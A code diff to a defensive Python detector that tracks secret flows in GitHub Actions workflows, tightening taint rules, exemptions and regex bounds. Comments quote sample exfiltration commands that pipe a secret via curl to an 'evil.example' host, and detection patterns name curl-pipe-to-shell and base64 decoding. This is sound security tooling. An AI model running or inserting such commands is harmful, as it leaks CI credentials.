@@ -37,6 +37,21 @@ What this detector must defend against:
     when ANY env binding in the same job derives from a secret, we
     treat ``toJSON(env)`` as a sink.
 
+  * **Untrusted action + secret-bound job env, no tainted inputs**
+    — DELIBERATELY NOT FLAGGED (accepted-miss trade-off).  A job
+    with ``env: NPM_TOKEN: ${{ secrets.NPM_TOKEN }}`` running
+    ``uses: attacker/action@v1`` with no ``with:`` block exports
+    the job env to the action's process, which can read the secret
+    directly.  Job-level env taint is only consulted for the
+    ``actions/upload-artifact`` / ``actions/cache`` sinks: flagging
+    EVERY non-allowlisted action inside an env-tainted job would
+    fire on the dominant legitimate CI shape (job-scoped tokens +
+    third-party build/setup actions) and drown the high-signal
+    rows.  Mitigations that still apply: the action ref itself is
+    covered by gha_drift (mutable ref) / gha_freshness; a ``with:``
+    input carrying the secret IS flagged.  Revisit if a
+    per-action-reputation signal lands.
+
   * **Custom local actions** — ``uses: ./.github/actions/foo``.
     These bypass the trusted-consumer allowlist because they're
     project-local; we conservatively treat them as UNTRUSTED (the
@@ -46,10 +61,14 @@ What this detector must defend against:
     interpretation would recurse into ``./.github/actions/foo/action.yml``
     — left for a follow-on.
 
-  * **Reusable workflows** — ``uses: org/repo/.github/workflows/foo.yml@ref``
-    with ``secrets: inherit`` or explicit secret passing.  Defence:
-    emit a low-severity informational finding (cross-workflow flow
-    is out of static scope here).
+  * **Reusable workflows** — invoked at JOB level:
+    ``jobs.<id>.uses: org/repo/.github/workflows/foo.yml@ref`` with
+    ``secrets: inherit`` (forwards EVERY repository secret) or an
+    explicit ``secrets:`` map.  Defence: emit a low-severity
+    informational ``reusable_workflow_inherit`` finding naming the
+    forwarded secrets (cross-workflow flow is out of static scope
+    here).  A ``.yml``-suffixed STEP-level ``uses:`` is not valid
+    GHA; if one appears it is treated as an untrusted action.
 
   * **echo-with-mask** — ``run: echo "::add-mask::${{ secrets.X }}"``
     is the canonical legitimate use of a secret in a ``run:`` body.
@@ -72,7 +91,12 @@ What this detector must defend against:
     ``KEY`` to the job's ``secret_bound_env`` so later sinks treat
     references to it as tainted just like a direct
     ``env: KEY: ${{ secrets.X }}`` binding.  The laundering step
-    itself doesn't fire — the downstream sink does.
+    itself doesn't fire — the downstream sink does.  GitHub's
+    documented MULTILINE env-file framing (``KEY<<DELIM`` written
+    to the target, value lines, then the bare delimiter) binds
+    ``KEY`` the same way when any interior content is tainted —
+    both the grouped one-liner and the per-line three-append
+    spellings.
 
   * **Cross-step laundering via ``$GITHUB_OUTPUT``** — an earlier
     step (with an ``id:``) writes ``KEY=<secret-derived>`` to
@@ -105,6 +129,7 @@ from core.json import load_json_bounded
 
 from .._yaml_fast import safe_load
 from ..models import Confidence, Dependency, Manifest, PinStyle
+from ..parsers import _safe_read
 
 logger = logging.getLogger(__name__)
 
@@ -123,7 +148,15 @@ _MAX_BALANCED_WALK_BYTES = 100_000  # ``_find_balanced`` walk limit
 _MAX_HEREDOC_BODY_BYTES = 100_000   # per-heredoc close-search window
 
 
-# Trusted-consumer allowlist (lazy-loaded).
+# Trusted-consumer allowlist (lazy-loaded from
+# data/gha_trusted_secret_consumers.json). Hand-curated AND
+# suppression-direction (a listed action's secret flow is not
+# flagged) — accepted deliberately: "which actions legitimately
+# receive secrets" is inherently operator judgment with no
+# mechanical source to derive from. Review trigger: when a listed
+# action changes ownership/publisher or a new secret-consuming
+# action becomes common enough that operators keep hand-waiving it,
+# adjudicate the JSON entry — never auto-extend.
 _TRUSTED: set[str] | None = None
 
 
@@ -159,13 +192,53 @@ def _action_name(uses: str) -> str:
 _SECRETS_LITERAL_RE = re.compile(
     r"\$\{\{\s*secrets\.[A-Za-z_][A-Za-z0-9_]*\s*\}\}"
 )
+# The key body is bounded: an unbounded ``[^\]]+`` re-scans every
+# planted ``${{ secrets[`` opener inside an unclosed access —
+# quadratic on hostile workflow text. 256 is far above any real
+# computed-key expression; a longer body stops matching.
 _SECRETS_DICT_RE = re.compile(
-    r"\$\{\{\s*secrets\[[^\]]+\]\s*\}\}"          # computed access
+    r"\$\{\{\s*secrets\[[^\]]{1,256}\]\s*\}\}"    # computed access
 )
 _TOJSON_SECRETS_RE = re.compile(
     r"\$\{\{\s*toJSON\s*\(\s*secrets\s*\)\s*\}\}",
     re.IGNORECASE,
 )
+# Expression interiors + the unanchored reference grammars used to
+# scan INSIDE them. format()/join()/fromJSON() are first-class GHA
+# expression functions any workflow author can write, so anchoring
+# ``secrets.`` to sit immediately after ``${{`` (the literal regexes
+# above) silently missed every wrapped reference at the two
+# highest-severity sinks — ``${{ format('{0}', secrets.X) }}`` was
+# a complete evasion. The taint-laundering path (_value_is_tainted)
+# always had the permissive grammar; the sinks now share it, scoped
+# to ``${{ … }}`` interiors so prose mentioning ``secrets.FOO``
+# outside an expression can't false-positive.
+# The expression body is bounded: a lazy unbounded body re-scans the
+# rest of a hostile workflow from every planted ``${{`` opener with no
+# closer — quadratic. Real GitHub expressions sit far below 2000
+# chars; a longer body simply keeps that decoy span from matching.
+_EXPR_RE = re.compile(r"\$\{\{(.{0,2000}?)\}\}", re.DOTALL)
+_SECRETS_NAME_RE = re.compile(r"\bsecrets\.([A-Za-z_][A-Za-z0-9_]*)")
+_TOJSON_SECRETS_INNER_RE = re.compile(
+    r"\btoJSON\s*\(\s*secrets\s*\)", re.IGNORECASE,
+)
+
+
+def _expression_secret_refs(text: str) -> list[str]:
+    """Secret names referenced anywhere inside ``${{ … }}``
+    expressions in ``text``; a ``toJSON(secrets)`` whole-context
+    reference is reported as ``"*"`` (all secrets)."""
+    out: list[str] = []
+    for m in _EXPR_RE.finditer(text):
+        inner = m.group(1)
+        out.extend(
+            nm.group(1) for nm in _SECRETS_NAME_RE.finditer(inner)
+        )
+        if _TOJSON_SECRETS_INNER_RE.search(inner):
+            out.append("*")
+    return out
+
+
 _TOJSON_ENV_RE = re.compile(
     r"\$\{\{\s*toJSON\s*\(\s*env\s*\)\s*\}\}",
     re.IGNORECASE,
@@ -460,9 +533,9 @@ def _extract_redirect_blocks(
         argument is recursively scanned)
 
     Still NOT covered (documented for the next adversarial pass):
-      * Chained alias: ``A=$T; B=$A`` (only ``A`` is followed)
-      * Variable indirection: ``T=GITHUB_ENV; ... >> ${!T}``
       * Quote concatenation: ``T="$"; ... >> "${T}GITHUB_ENV"``
+        (chained aliases and ``${!T}`` variable indirection ARE
+        covered — see ``_aliased_targets``)
 
     Adversarial: each new evasion shape we close raises the cost of
     the next one.  The remaining gaps require either bash-parser-
@@ -581,7 +654,7 @@ def _extract_redirect_blocks(
     # Per-line uses ORIGINAL body — masking doesn't help here and
     # would erase the ``${{ secrets.X }}`` content the KEY=VALUE
     # extractor needs to see.
-    for line in body.split("\n"):
+    for line in body.split("\n"):  # line-model: YAML scalar loading already normalised line breaks to \n
         if not redirect_re.search(line):
             continue
         if "<<" in line:
@@ -612,12 +685,88 @@ def _extract_redirect_blocks(
     return blocks
 
 
+# Redirect-destination token names — never KEY bindings themselves.
+_TARGET_TOKEN_NAMES = ("GITHUB_ENV", "GITHUB_OUTPUT", "GITHUB_PATH")
+
+# GitHub's documented multiline env-file framing: writing
+# ``KEY<<DELIM`` to the target opens a frame; everything written
+# until the bare delimiter is KEY's value. The ``KEY`` sits
+# immediately before ``<<`` (a real shell heredoc is spelled with
+# whitespace before ``<<`` and is handled by the heredoc block arm).
+# The key is pinned to its identifier-run start: unpinned, every
+# position of a hostile identifier run starts a fresh scan for the
+# ``<<`` that never comes — quadratic. The only match-set delta is
+# mid-word starts (a key glued to a preceding word char), which the
+# documented env-file framing never produces.
+_KEY_HEREDOC_OPEN_RE = re.compile(
+    r"(?<![A-Za-z0-9_])([A-Za-z_][A-Za-z0-9_]*)<<-?['\"]?([A-Za-z_][A-Za-z0-9_]*)"
+)
+
+
+def _extract_envfile_multiline_writes(
+    body: str, target: str,
+) -> list[tuple]:
+    """Extract ``[(key, interior)]`` pairs from GitHub's documented
+    multiline env-file syntax (``KEY<<DELIM`` … ``DELIM`` written to
+    the target) — grouped one-liners and the per-line three-append
+    spelling the GitHub docs show. The interior is handed to the
+    caller's taint check verbatim; only content actually redirected
+    to the target participates."""
+    if len(body) > _MAX_RUN_BODY_BYTES:
+        body = body[:_MAX_RUN_BODY_BYTES]
+    aliases = _aliased_targets(body, target)
+    target_alts = [target, *aliases][:_MAX_ALIAS_SET_SIZE]
+    target_pat = _multi_redirect_target_pattern(target_alts)
+    redirect_re = re.compile(rf">>?\s*{target_pat}")
+    tee_re = re.compile(rf"\|\s*tee\s+(?:-a\s+)?{target_pat}")
+    pairs: list[tuple] = []
+    open_key: str | None = None
+    close_re: re.Pattern[str] | None = None
+    parts: list[str] = []
+    for line in body.split("\n"):  # line-model: YAML scalar loading already normalised line breaks to \n
+        rm = redirect_re.search(line) or tee_re.search(line)
+        if rm is None:
+            # Content not written to the target — not part of the
+            # env-file stream, frame state unchanged.
+            continue
+        content = line[:rm.start()]
+        pos = 0
+        while True:
+            if open_key is None:
+                m = _KEY_HEREDOC_OPEN_RE.search(content, pos)
+                if m is None or m.group(1) in _TARGET_TOKEN_NAMES:
+                    break
+                open_key = m.group(1)
+                close_re = re.compile(
+                    rf"(?<![A-Za-z0-9_]){re.escape(m.group(2))}"
+                    rf"(?![A-Za-z0-9_])"
+                )
+                parts = []
+                pos = m.end()
+            else:
+                assert close_re is not None
+                c = close_re.search(content, pos)
+                if c is None:
+                    parts.append(content[pos:])
+                    break
+                parts.append(content[pos:c.start()])
+                pairs.append((open_key, "\n".join(parts)))
+                open_key = None
+                close_re = None
+                parts = []
+                pos = c.end()
+                if len(pairs) > _MAX_REDIRECT_BLOCKS_PER_BODY:
+                    return pairs[:_MAX_REDIRECT_BLOCKS_PER_BODY]
+    return pairs
+
+
 def _extract_redirected_writes(
     body: str, target: str,
 ) -> list[tuple]:
     """Extract ``[(key, value)]`` pairs written to a target
     (``GITHUB_ENV`` / ``GITHUB_OUTPUT``) across all supported
-    redirect shapes."""
+    redirect shapes, including the documented multiline
+    ``KEY<<DELIM`` env-file framing."""
     pairs: list[tuple] = []
     for block in _extract_redirect_blocks(body, target):
         for m in _KEY_VALUE_RE.finditer(block):
@@ -625,9 +774,10 @@ def _extract_redirected_writes(
             value = m.group(2).strip().strip('"').strip("'")
             # Drop the special token names — these are the redirect
             # destinations, not actual KEY=VALUE writes.
-            if key in ("GITHUB_ENV", "GITHUB_OUTPUT", "GITHUB_PATH"):
+            if key in _TARGET_TOKEN_NAMES:
                 continue
             pairs.append((key, value))
+    pairs.extend(_extract_envfile_multiline_writes(body, target))
     return pairs
 
 
@@ -731,10 +881,16 @@ class _JobContext:
     # ``upload-artifact`` for unrelated build outputs).
 
 
+# The argument fillers here and in _VAR_DUMP_RE_FACTORY are bounded:
+# unbounded, every planted command keyword on an unredirected line
+# re-scans the rest of the line — quadratic on hostile workflow
+# text. The bounds sit far above any real dump-to-file command
+# line (and, in the var-dump shape, keep the filler/variable/filler
+# fan-out constant); a longer gap stops matching.
 _ENV_DUMP_RE = re.compile(
     r"""
     \b(?:env|printenv|set|export\s+-p)\b   # env-dumping commands
-    [^\n|>]*                                # anything except pipe/newline/redirect
+    [^\n|>]{0,500}                          # anything except pipe/newline/redirect
     >+(?!>)                                 # all consecutive > (no backtracking past last >)
     \s*
     (?:"|'|)                                # optional quote
@@ -742,12 +898,21 @@ _ENV_DUMP_RE = re.compile(
     """,
     re.VERBOSE,
 )
+# (?=\S) pins the whitespace run before the lazy argument filler
+# (same language — the filler absorbed any remainder): the naive
+# ``\s+[^\n|]*?`` overlapped the run and the filler — quadratic on
+# an echo-opening line ending in a whitespace run.
+# The pre-variable filler is additionally tempered against the
+# variable reference itself, so a line dense in ``$VAR`` teasers
+# cannot multiply the filler/variable/filler decompositions — the
+# match always binds the first reference in its window; a redirect
+# more than the filler bound past that reference stops matching.
 _VAR_DUMP_RE_FACTORY = lambda var: re.compile(
     rf"""
-    \b(?:echo|printf)\s+
-    [^\n|]*?
+    \b(?:echo|printf)\s+(?=\S)
+    (?:(?!\$\{{?{re.escape(var)})[^\n|]){{0,200}}?
     \$\{{?{re.escape(var)}\}}?
-    [^\n|>]*
+    [^\n|>]{{0,300}}
     >+(?!>)
     \s*
     (?!\s*\$\{{?GITHUB_(?:ENV|OUTPUT|PATH))
@@ -788,8 +953,77 @@ def _strip_bash_full_line_comments(body: str) -> str:
     """
     return "\n".join(
         "" if line.lstrip().startswith("#") else line
-        for line in body.split("\n")
+        for line in body.split("\n")  # line-model: YAML scalar loading already normalised line breaks to \n
     )
+
+
+# Known stdin-credential consumers for the ``--password-stdin``
+# exemption.  The exemption must NAME the consumer: the earlier
+# ``| <anything> ... --password-stdin`` shape was attacker-
+# satisfiable — ``echo "$SECRET" | sh -c 'curl -d @- https://evil.
+# example' --password-stdin`` exfiltrates (sh -c ignores trailing
+# args as $0) yet matched, suppressing the run_block finding.
+_STDIN_CONSUMERS = (
+    r"(?:docker|podman|buildah|nerdctl|skopeo|oras|crane|helm|regctl)"
+)
+_STDIN_PIPE_RE = re.compile(
+    # Anchored to the WHOLE stripped line: the exemption applies to
+    # the exact single-command shape only.  An unanchored search let
+    # anything ride shotgun on the same line — ``… --password-stdin
+    # && echo "$TOKEN" | curl -d @- https://evil.example`` exempted
+    # the exfil because the line CONTAINED a matching prefix.
+    r"""^echo\s+["']?\$(?:\{\{[^}]*secrets\.[^}]*\}\}|"""
+    r"""[A-Z_]+)["']?\s*\|\s*"""
+    + _STDIN_CONSUMERS
+    # Subcommand chain ending in ``login`` (``login`` / ``auth
+    # login`` / ``registry login``), then only plain arguments
+    # BEFORE AND AFTER the flag, to end of line: no pipes,
+    # separators, redirects, backticks or ``$(`` command
+    # substitution may appear anywhere in the exempted token stream
+    # (plain ``$VAR`` / ``${{ ... }}`` expansions are fine).
+    # The subcommand loop is bounded ({0,16}): it overlaps the
+    # ``login`` literal on word chars, so an unbounded loop cost
+    # every split of a subcommand-word run — quadratic. Sixteen
+    # subcommand tokens sits far above real CLI chains.
+    # (?=\S) pins the post-login whitespace run — the argument
+    # class admits whitespace, so an unpinned run split against it
+    # (quadratic on a login line ending in a whitespace run).
+    + r"""\s+(?:[\w.-]+\s+){0,16}login\s+(?=\S)(?:\$(?!\()|[^|;&<>$`])*"""
+    + r"""--password-stdin(?:\$(?!\()|[^|;&<>$`])*$""",
+)
+
+
+def _all_refs_stdin_piped(
+    body: str, secret_env: dict[str, str],
+) -> bool:
+    """True when every secret-referencing line in the body uses the
+    ``echo "$SECRET" | <command> --password-stdin`` pattern — the
+    standard safe credential-passing form for docker login et al.
+
+    Only inspects direct secret literals and secret-bound env vars;
+    step-output taint is invisible here.  Returns False when no
+    direct-ref lines are found (no vacuous truth) so callers that
+    also track step-output taint are not accidentally suppressed."""
+    lines = body.splitlines()
+    found_any = False
+    for line in lines:
+        stripped = line.strip()
+        if not stripped or stripped.startswith("#"):
+            continue
+        has_secret_ref = False
+        for m in _SECRETS_LITERAL_RE.finditer(stripped):
+            has_secret_ref = True
+        for m in _ENV_SHELL_RE.finditer(stripped):
+            if m.group(1) in secret_env:
+                has_secret_ref = True
+        for m in _ENV_TEMPLATE_RE.finditer(stripped):
+            if m.group(1) in secret_env:
+                has_secret_ref = True
+        if has_secret_ref:
+            found_any = True
+            if not _STDIN_PIPE_RE.search(stripped):
+                return False
+    return found_any
 
 
 def _is_truthy_run_body_egress(body: str) -> bool:
@@ -804,9 +1038,13 @@ def _is_truthy_run_body_egress(body: str) -> bool:
     # artifact uploads later)
     if re.search(r">>?\s*\$?GITHUB_(OUTPUT|ENV)|>>?\s*/tmp/", body):
         return True
-    # IFS / base64 / curl-pipe-shell
+    # IFS / base64 / curl-pipe-shell. The curl-to-pipe gap is
+    # bounded: unbounded, every planted ``curl`` on an unpiped line
+    # re-scanned the rest of the line — quadratic on hostile run
+    # bodies. 1000 is far above any real fetch-and-pipe command.
     return bool(
-        re.search(r"curl.+\|\s*(?:bash|sh)|base64\s+(?:-d|--decode)", body)
+        re.search(r"curl.{1,1000}\|\s*(?:bash|sh)|base64\s+(?:-d|--decode)",
+                  body)
     )
 
 
@@ -886,7 +1124,6 @@ def _scan_one_step(
     if isinstance(uses, str):
         action_name = _action_name(uses)
         is_local = action_name.startswith(("./", "../"))
-        is_reusable_workflow = action_name.endswith((".yml", ".yaml"))
         # Trust any first-party ``actions/<name>`` action (GitHub's
         # official org).  The ``actions/`` GitHub org is the
         # canonical source of first-party workflow primitives; any
@@ -904,8 +1141,11 @@ def _scan_one_step(
             for in_name, in_val in with_inputs.items():
                 if not isinstance(in_val, str):
                     continue
-                if (_SECRETS_LITERAL_RE.search(in_val)
-                        or _TOJSON_SECRETS_RE.search(in_val)):
+                # Expression-scoped unanchored grammar: catches the
+                # plain ``${{ secrets.X }}`` / ``${{ toJSON(secrets)
+                # }}`` spellings AND expression-function wraps
+                # (``${{ format('{0}', secrets.X) }}``).
+                if _expression_secret_refs(in_val):
                     tainted_inputs.append(str(in_name))
                     continue
                 # env.X referenced + X is secret-bound in this job
@@ -948,21 +1188,12 @@ def _scan_one_step(
                     ),
                     severity="medium",
                 ))
-            elif is_reusable_workflow:
-                hits.append(SecretFlowHit(
-                    dependency=dep, workflow_path=workflow_path,
-                    job_id=job_id, step_index=step_index,
-                    sink_kind="reusable_workflow_inherit",
-                    secret_names=tuple(tainted_inputs),
-                    detail=(
-                        f"reusable workflow ``{action_name}`` "
-                        f"receives secret-tainted input(s) "
-                        f"{tainted_inputs!r}; static scope ends at "
-                        "the workflow boundary"
-                    ),
-                    severity="low",
-                ))
             else:
+                # NOTE: a ``.yml``-suffixed step-level ``uses:`` is
+                # not valid GHA (reusable workflows are invoked at
+                # JOB level — handled in ``_scan_workflow``); if one
+                # appears anyway it lands here as an untrusted
+                # action, the fail-closed direction.
                 hits.append(SecretFlowHit(
                     dependency=dep, workflow_path=workflow_path,
                     job_id=job_id, step_index=step_index,
@@ -982,7 +1213,17 @@ def _scan_one_step(
         # Otherwise downgrades to medium (informational — the upload
         # carries the secret only if some step writes it to disk
         # first, which we couldn't detect; reviewer triages).
-        if action_name == "actions/upload-artifact" and env_tainted:
+        # Skip when the ONLY tainted env var is GITHUB_TOKEN (an
+        # ephemeral, auto-scoped token that GitHub rotates per-job)
+        # and no env-to-disk write preceded the upload.
+        _only_github_token = (
+            set(job_ctx.secret_bound_env.keys()) == {"GITHUB_TOKEN"}
+        )
+        if (
+            action_name == "actions/upload-artifact"
+            and env_tainted
+            and not (_only_github_token and not job_ctx.env_written_to_disk)
+        ):
             if job_ctx.env_written_to_disk:
                 severity = "high"
                 detail_suffix = (
@@ -1084,15 +1325,14 @@ def _scan_one_step(
         # could silence the detector for a secret by adding a mask
         # line for it.)
         ref_scan_body = _MASK_RE.sub("", scan_body)
-        # Check whether the body references a secret literal,
-        # a secret-tainted env var, or a tainted prior-step output.
+        # Check whether the body references a secret literal (plain
+        # or wrapped in an expression function — the unanchored
+        # grammar scoped to ``${{ … }}`` interiors), a
+        # secret-tainted env var, or a tainted prior-step output.
         secret_refs_in_body: list[str] = []
-        for m in _SECRETS_LITERAL_RE.finditer(ref_scan_body):
-            name_match = re.search(
-                r"secrets\.([A-Za-z_][A-Za-z0-9_]*)", m.group(0),
-            )
-            if name_match:
-                secret_refs_in_body.append(name_match.group(1))
+        secret_refs_in_body.extend(
+            _expression_secret_refs(ref_scan_body),
+        )
         for m in _ENV_SHELL_RE.finditer(ref_scan_body):
             var = m.group(1)
             if var in job_ctx.secret_bound_env:
@@ -1112,6 +1352,16 @@ def _scan_one_step(
             if out_name in bound:
                 secret_refs_in_body.append(bound[out_name])
         unmasked_refs = secret_refs_in_body
+        # Safe-sink exemption: piping a secret into a command's
+        # stdin (e.g. ``echo "$TOKEN" | docker login --password-stdin``)
+        # is the RECOMMENDED credential-passing pattern — the secret
+        # never touches the filesystem or process argv. Suppress the
+        # finding when every secret reference in the body appears only
+        # inside a pipe-to-stdin pattern.
+        if unmasked_refs and _all_refs_stdin_piped(
+            ref_scan_body, job_ctx.secret_bound_env,
+        ):
+            unmasked_refs = []
         if unmasked_refs:
             severity = (
                 "high"
@@ -1154,26 +1404,68 @@ def _scan_one_step(
     return hits
 
 
+def _scan_reusable_workflow_job(
+    job: dict,
+    job_id: str,
+    job_uses: str,
+    workflow_path: Path,
+    dep: Dependency,
+) -> list[SecretFlowHit]:
+    """Job-level ``uses:`` — a reusable-workflow invocation.
+
+    Cross-workflow flow is out of static scope here (the called
+    workflow may live in another repo at a mutable ref), so the
+    finding is low-severity informational, per the adversarial-model
+    contract: ``secrets: inherit`` forwards EVERY repository secret;
+    an explicit ``secrets:`` map forwards the named ones.  A call
+    that passes no secrets gets no finding.
+    """
+    secrets_val = job.get("secrets")
+    if secrets_val == "inherit":
+        return [SecretFlowHit(
+            dependency=dep, workflow_path=workflow_path,
+            job_id=job_id, step_index=0,
+            sink_kind="reusable_workflow_inherit",
+            secret_names=("*",),
+            detail=(
+                f"job invokes reusable workflow ``{job_uses}`` with "
+                "``secrets: inherit`` — EVERY repository secret is "
+                "forwarded; static scope ends at the workflow boundary"
+            ),
+            severity="low",
+        )]
+    if isinstance(secrets_val, dict) and secrets_val:
+        names = tuple(sorted(str(k) for k in secrets_val))
+        return [SecretFlowHit(
+            dependency=dep, workflow_path=workflow_path,
+            job_id=job_id, step_index=0,
+            sink_kind="reusable_workflow_inherit",
+            secret_names=names,
+            detail=(
+                f"job invokes reusable workflow ``{job_uses}`` "
+                f"passing secret(s) {list(names)!r}; static scope "
+                "ends at the workflow boundary"
+            ),
+            severity="low",
+        )]
+    return []
+
+
 def _scan_workflow(
     workflow_path: Path, dep: Dependency,
 ) -> list[SecretFlowHit]:
     """Parse one workflow YAML and scan every job's every step."""
-    try:
-        # Read-cap defends against a pathologically large workflow
-        # YAML.  Real GitHub Actions caps workflow files at 1 MB
-        # (documented limit); we accept up to 2 MB to be generous
-        # for forked workflow tooling that may not enforce the
-        # limit locally.
-        with workflow_path.open(encoding="utf-8", errors="replace") as f:
-            text = f.read(_MAX_WORKFLOW_YAML_BYTES + 1)
-        if len(text) > _MAX_WORKFLOW_YAML_BYTES:
-            logger.debug(
-                "sca.supply_chain.gha_secret_flow: %s exceeds %d bytes "
-                "— skipping (DoS bound)",
-                workflow_path, _MAX_WORKFLOW_YAML_BYTES,
-            )
-            return []
-    except OSError:
+    # Read-cap defends against a pathologically large workflow
+    # YAML.  Real GitHub Actions caps workflow files at 1 MB
+    # (documented limit); we accept up to 2 MB to be generous
+    # for forked workflow tooling that may not enforce the
+    # limit locally.  The shared bounded reader also refuses
+    # symlinks and non-regular files (FIFO hang / host-file read).
+    text = _safe_read.read_bounded(
+        workflow_path, max_bytes=_MAX_WORKFLOW_YAML_BYTES,
+        follow_symlinks=False,
+    )
+    if text is None:
         return []
     try:
         data = safe_load(text)
@@ -1208,6 +1500,17 @@ def _scan_workflow(
         # binding of the same name.
         _merge_env_bindings(job.get("env"), ctx.secret_bound_env,
                             override=True)
+        # Reusable workflows are invoked at JOB level
+        # (``jobs.<id>.uses`` + ``secrets: inherit`` / an explicit
+        # ``secrets:`` map) — such jobs have no ``steps`` and were
+        # previously skipped whole, making the documented
+        # ``reusable_workflow_inherit`` finding unreachable.
+        job_uses = job.get("uses")
+        if isinstance(job_uses, str):
+            hits.extend(_scan_reusable_workflow_job(
+                job, str(job_id), job_uses, workflow_path, dep,
+            ))
+            continue
         steps = job.get("steps")
         if not isinstance(steps, list):
             continue
